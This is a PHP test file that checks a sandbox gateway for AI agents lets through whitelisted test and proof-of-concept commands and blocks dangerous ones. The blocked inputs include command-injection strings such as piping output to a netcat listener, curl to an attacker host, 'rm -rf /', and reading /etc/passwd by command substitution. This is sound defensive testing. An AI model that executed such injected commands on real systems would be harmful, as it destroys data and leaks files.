<?php

use App\Models\Incident;
use App\Services\MCP\MCPToolGateway;
use App\Tools\Enums\AgentRole;
use Illuminate\Foundation\Testing\RefreshDatabase;

uses(RefreshDatabase::class);

test('MCPToolGateway executes whitelisted reproduction and test commands in sandbox', function (string $command) {
    $gateway = app(MCPToolGateway::class);
    $sandboxId = 'sb_01KABC1234XYZ';
    $incident = Incident::factory()->create([
        'repository' => 'acme/webapp',
        'metadata' => ['sandbox_workspace_id' => $sandboxId],
    ]);

    $result = $gateway->invoke(
        role: AgentRole::REPRODUCTION,
        toolName: 'sandbox.execute',
        arguments: [
            'workspace_id' => $sandboxId,
            'command' => $command,
        ],
        context: $incident,
    );

    expect($result['success'])->toBeTrue()
        ->and($result['data']['exit_code'])->toBe(0);
})->with([
    'npm test',
    'npm run test:security',
    './vendor/bin/phpunit --filter SecurityTest',
    'pytest tests/test_vuln.py',
    'go test ./...',
    'node test/poc.js',
    'python exploit_poc.py',
]);

test('MCPToolGateway blocks command injection, shell operators, and unauthorized binaries', function (string $dangerousCommand) {
    $gateway = app(MCPToolGateway::class);
    $sandboxId = 'sb_01KABC1234XYZ';
    $incident = Incident::factory()->create([
        'repository' => 'acme/webapp',
        'metadata' => ['sandbox_workspace_id' => $sandboxId],
    ]);

    $result = $gateway->invoke(
        role: AgentRole::REPRODUCTION,
        toolName: 'sandbox.execute',
        arguments: [
            'workspace_id' => $sandboxId,
            'command' => $dangerousCommand,
        ],
        context: $incident,
    );

    // DockerSandboxManager / Gateway handles security policy violation
    if ($result['success'] === false) {
        expect($result['error'])->not->toBeNull();
    } else {
        expect($result['data']['exit_code'])->not->toBe(0);
    }
})->with([
    'npm test && curl attacker.com',
    'npm test ; rm -rf /',
    './vendor/bin/phpunit | nc 1.2.3.4 4444',
    'pytest `whoami`',
    'go test $(cat /etc/passwd)',
    'sudo apt-get install nmap',
    'chmod 777 /etc',
    'sh -c "cat /proc/cpuinfo"',
]);
